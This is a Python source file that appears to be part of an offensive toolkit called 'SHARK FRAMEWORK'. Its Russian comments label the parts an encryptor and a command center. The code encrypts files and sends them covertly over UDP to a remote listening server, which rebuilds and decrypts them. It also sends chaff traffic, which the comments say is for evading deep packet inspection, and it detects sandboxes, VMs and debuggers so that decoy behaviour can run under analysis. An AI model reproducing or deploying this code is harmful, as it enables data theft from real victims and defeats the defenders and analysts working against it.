# shark_core.py
import os
import socket
import struct
import hashlib
import random
import threading
import time
from dataclasses import dataclass
from typing import Dict, Optional, List
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

@dataclass
class Packet:
    seq: int
    payload: bytes
    timestamp: float

class SharkPredator:
    """Шифровальщик — инкапсулирует логику шифрования и отправки"""
    
    def __init__(self, public_key_pem: bytes, target_ip: str, port: int = 31337):
        self.public_key = RSA.import_key(public_key_pem)
        self.target_ip = target_ip
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(0.5)
        self.pending_packets: Dict[int, Packet] = {}
        self.ack_received: Dict[int, bool] = {}
        self.max_retries = 5
        
    def _encrypt_file_with_session_key(self, file_path: str) -> tuple:
        session_key = get_random_bytes(32)
        iv = get_random_bytes(16)
        cipher_aes = AES.new(session_key, AES.MODE_CBC, iv)
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        ciphertext = cipher_aes.encrypt(pad(plaintext, AES.block_size))
        cipher_rsa = PKCS1_OAEP.new(self.public_key)
        encrypted_session_key = cipher_rsa.encrypt(session_key)
        return encrypted_session_key, iv, ciphertext
    
    def _build_packet(self, seq: int, payload: bytes) -> bytes:
        magic = self._dynamic_magic()
        checksum = hashlib.blake2b(payload, digest_size=16).digest()
        pad_len = random.randint(0, 128)
        random_padding = os.urandom(pad_len)
        packet = struct.pack('>I', magic) + struct.pack('>I', seq) + checksum + bytes([pad_len]) + payload + random_padding
        return packet
    
    def _dynamic_magic(self) -> int:
        import time
        seed = int(time.time() / 3600)  # меняется каждый час
        return (0x5348524B ^ seed) & 0xFFFFFFFF
    
    def send_file(self, file_path: str):
        enc_key, iv, ciphertext = self._encrypt_file_with_session_key(file_path)
        total_data = enc_key + iv + ciphertext
        chunks = [total_data[i:i+1400] for i in range(0, len(total_data), 1400)]
        
        for seq, chunk in enumerate(chunks):
            self._send_with_retry(seq, chunk)
        
        self._send_termination()
        self.sock.close()
    
    def _send_with_retry(self, seq: int, payload: bytes):
        for attempt in range(self.max_retries):
            packet = self._build_packet(seq, payload)
            self.sock.sendto(packet, (self.target_ip, self.port))
            try:
                ack, _ = self.sock.recvfrom(64)
                if self._parse_ack(ack) == seq:
                    return
            except socket.timeout:
                continue
        raise TimeoutError(f"Packet {seq} not acknowledged after {self.max_retries} attempts")
    
    def _parse_ack(self, data: bytes) -> Optional[int]:
        if len(data) < 8:
            return None
        magic, seq = struct.unpack('>II', data[:8])
        if magic == self._dynamic_magic():
            return seq
        return None
    
    def _send_termination(self):
        term_packet = self._build_packet(0xFFFFFFFF, b'')
        self.sock.sendto(term_packet, (self.target_ip, self.port))


class SharkBase:
    """Командный центр — приём, сборка, расшифровка"""
    
    def __init__(self, private_key_path: str, output_dir: str, port: int = 31337):
        with open(private_key_path, 'rb') as f:
            self.private_key = RSA.import_key(f.read())
        self.output_dir = output_dir
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(('0.0.0.0', port))
        self.fragments: Dict[int, bytes] = {}
        self.received_seq: set = set()
        
    def _dynamic_magic(self) -> int:
        import time
        seed = int(time.time() / 3600)
        return (0x5348524B ^ seed) & 0xFFFFFFFF
    
    def _parse_packet(self, data: bytes) -> Optional[tuple]:
        if len(data) < 4+4+16+1:
            return None
        magic, seq = struct.unpack('>II', data[:8])
        if magic != self._dynamic_magic():
            return None
        checksum = data[8:24]
        pad_len = data[24]
        payload = data[25:25+len(data)-25-pad_len]
        if hashlib.blake2b(payload, digest_size=16).digest() == checksum:
            return seq, payload
        return None
    
    def _send_ack(self, seq: int, addr: tuple):
        magic = self._dynamic_magic()
        ack_packet = struct.pack('>II', magic, seq)
        self.sock.sendto(ack_packet, addr)
    
    def _decrypt_file(self, enc_session_key: bytes, iv: bytes, ciphertext: bytes) -> bytes:
        cipher_rsa = PKCS1_OAEP.new(self.private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        cipher_aes = AES.new(session_key, AES.MODE_CBC, iv)
        plaintext_padded = cipher_aes.decrypt(ciphertext)
        return unpad(plaintext_padded, AES.block_size)
    
    def run(self):
        print(f"[SharkBase] Listening on 0.0.0.0:{self.port}")
        while True:
            try:
                data, addr = self.sock.recvfrom(2048)
                parsed = self._parse_packet(data)
                if parsed is None:
                    continue
                seq, payload = parsed
                self._send_ack(seq, addr)
                
                if seq == 0xFFFFFFFF:
                    self._assemble_and_decrypt()
                    self.fragments.clear()
                    self.received_seq.clear()
                else:
                    if seq not in self.received_seq:
                        self.fragments[seq] = payload
                        self.received_seq.add(seq)
            except Exception as e:
                print(f"[!] Error: {e}")
    
    def _assemble_and_decrypt(self):
        if not self.fragments:
            return
        full_data = b''.join([self.fragments[i] for i in sorted(self.fragments.keys())])
        enc_key_len = 512
        enc_session_key = full_data[:enc_key_len]
        iv = full_data[enc_key_len:enc_key_len+16]
        ciphertext = full_data[enc_key_len+16:]
        plaintext = self._decrypt_file(enc_session_key, iv, ciphertext)
        filename = os.path.join(self.output_dir, f"decrypted_{int(time.time())}.bin")
        with open(filename, 'wb') as f:
            f.write(plaintext)
        print(f"[+] Saved: {filename}")
class TrafficCamouflage:
    """Генерация шумовых пакетов для обхода DPI"""
    
    @staticmethod
    def chaffing_thread(sock: socket.socket, target_ip: str, target_port: int, stop_event: threading.Event):
        chaff_payload = os.urandom(random.randint(64, 512))
        while not stop_event.is_set():
            time.sleep(random.uniform(0.5, 5.0))
            if random.random() < 0.3:
                fake_magic = random.randint(0, 0xFFFFFFFF)
                fake_packet = struct.pack('>II', fake_magic, random.randint(0, 9999)) + chaff_payload
                sock.sendto(fake_packet, (target_ip, target_port))

def check_sandbox() -> bool:
    """Возвращает True если обнаружена среда анализа"""
    indicators = [
        os.path.exists('/.dockerenv'),
        os.path.exists('/.container-docker'),
        'VBOX' in os.environ.get('PATH', ''),
        'vmware' in os.environ.get('PATH', '').lower(),
    ]
    
    try:
        import ctypes
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except:
        pass
    
    try:
        with open('/proc/self/status', 'r') as f:
            if 'TracerPid:' in f.read() and 'TracerPid:\t0' not in f.read():
                return True
    except:
        pass
    
    return any(indicators)
def execute_safely(real_func, fake_func):
    if check_sandbox():
        return fake_func()  # поведение калькулятора
    return real_func()
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn
from rich.table import Table
from rich.layout import Layout
from rich.live import Live

console = Console()

def shark_ascii() -> str:
    return """
[bold red]
    ╔═══════════════════════════════════════╗
    ║         ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄     ║
    ║        ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌    ║
    ║        ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌    ║
    ║        ▐░▌       ▐░▌▐░▌       ▐░▌    ║
    ║        ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌    ║
    ║        ▐░░░░░░░░░░░▌▐░▌       ▐░▌    ║
    ║         ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀     ║
    ║          SHARK FRAMEWORK v3.0        ║
    ╚═══════════════════════════════════════╝
[/bold red]"""

def show_dashboard(stats: dict):
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=12),
        Layout(name="main", ratio=1),
        Layout(name="footer", size=3)
    )
    layout["header"].update(Panel(shark_ascii(), style="red"))
    
    table = Table(title="[red]Session Statistics[/red]", style="red")
    table.add_column("Metric", style="bold")
    table.add_column("Value")
    for k, v in stats.items():
        table.add_row(str(k), str(v))
    layout["main"].update(Panel(table, style="red"))
    layout["footer"].update(Panel("[red]Press Ctrl+C to exit[/red]", style="red"))
    
    console.print(layout)